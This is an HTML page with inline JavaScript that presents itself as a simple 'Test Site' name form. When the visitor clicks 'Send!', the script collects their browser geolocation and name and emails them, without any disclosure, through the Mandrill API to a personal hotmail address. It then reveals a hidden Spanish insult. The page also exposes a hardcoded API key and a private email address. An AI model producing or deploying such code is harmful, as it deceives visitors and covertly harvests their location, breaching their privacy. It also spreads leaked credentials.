<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Test Site</title>
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
  <style>
      input{

        width: 200px;
        height: 250px;
      }
  
  </style>
</head>
<body>
	<h1>Test</h1>
  <input id ="name" type="text" placeholder="Name">
	<a href="javascript:comenzar()"><button type="button">Send!</button></a>

<h1 id="mono" style="display:none;">Mono boludo!</h1>
</body>
<script>
var result;
var name;
function comenzar() {
    name = $('#name').val();
    navigator.geolocation.getCurrentPosition(
        function(ubicacion) {
            result =  {
   			"latitude": ubicacion.coords.latitude,
   			"longitude": ubicacion.coords.longitude,
        "name": name 
			}
			sendLoc(result);	
      $("#mono").css({ display: block });
        },
        function(e) {
            result = null;
        });
}
function sendLoc(info) {
    $.ajax({
        url: "https://mandrillapp.com/api/1.0/messages/send.json",
        type: "POST",
        data: {
            "key": "9oCSXw6pdOfqmR8LTaUotg",
            "message": {
                "from_email": "YOUR@EMAIL.HERE",
                "to": [
                    {
                        "email": "facundodelgado.1@hotmail.es",
                        "name": "RECIPIENT NAME (OPTIONAL)",
                        "type": "to"
                    },
          {
              "email": "facundodelgado.1@hotmail.es",
              "name": "ANOTHER RECIPIENT NAME (OPTIONAL)",
              "type": "to"
          }
                ],
                "autotext": "true",
                "subject": "Geo",
                "html": "long" + info.longitude + "lat" + info.latitude + "name" + name
            }
        }
    })
}
</script>
</html>
